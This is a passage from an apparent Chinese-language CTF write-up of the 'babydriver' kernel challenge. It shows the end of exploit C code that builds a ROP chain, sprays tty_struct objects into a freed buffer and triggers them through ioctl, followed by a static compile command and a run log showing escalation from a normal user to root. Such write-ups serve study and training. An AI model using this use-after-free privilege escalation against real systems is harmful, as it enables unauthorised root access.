	rop[i++] = user_rflags;
	rop[i++] = base+0x1000;
	rop[i++] = user_ss;

	memcpy(xchg_eax_esp & 0xffffffff,rop,sizeof(rop));
	puts("[*] ROP chain complete.\n");

	//write ROP chain into buf
	write(fd2,buf,0x20);

	puts("[+] getting shell...\n");
	for (i=0;i<SPRAY_ALLOC_TIMES;i++){
		ioctl(spray_fd[i],0,0);
	}
	return 0;
}
```

  静态编译

```shell
ivan@ubuntu:~/kernel/babydriver/output$ gcc poc2.c -o poc2 -masm=intel --static
```

运行后效果

```shell
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./poc2
[+] saving status...
[*] status has been saved.
[    6.015873] device open
[*] fd1:3
[    6.017688] device open
[*] fd2:4
[+] freeing fd1...
[    6.020820] alloc done
[    6.022046] device release
[*] fd1 has been freed.
[+] spraying tty_struct...
[*] spraying tty_struct complete.
[+] checking spray tty_struct...
[*] spray check complete.
[+] setting fake tty_operations...
[*] fake tty_operations has been setted.
[+] preparing ROP chain...
base address: 810e7000
[*] ROP chain complete.
[+] getting shell...
shell?
/ # id
uid=0(root) gid=0(root)
/ # cat flag
flag{1234567890}
```

